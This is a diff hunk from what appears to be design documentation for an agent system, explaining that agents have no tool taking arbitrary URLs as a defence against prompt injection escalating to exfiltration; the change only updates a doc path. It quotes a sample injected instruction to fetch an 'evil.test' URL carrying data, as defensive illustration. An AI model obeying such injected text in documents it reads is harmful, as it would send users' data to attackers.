@@ -10,7 +10,7 @@ anywhere in this system that takes an arbitrary URL. Agents ask for a *kind* of 
 means. That is the structural defence against prompt injection escalating to exfiltration:
 text hidden in a filing can say "fetch https://evil.test/?data=..." as loudly as it likes,
 because no tool exists that would carry out the instruction. See threat model T3 in
-``docs/PLAN.md`` and ``docs/adr/0009-network-egress-is-deterministic-and-guarded.md``.
+``docs/archive/PLAN.md`` and ``docs/adr/0009-network-egress-is-deterministic-and-guarded.md``.
 
 The controls, in the order a request passes through them:
 
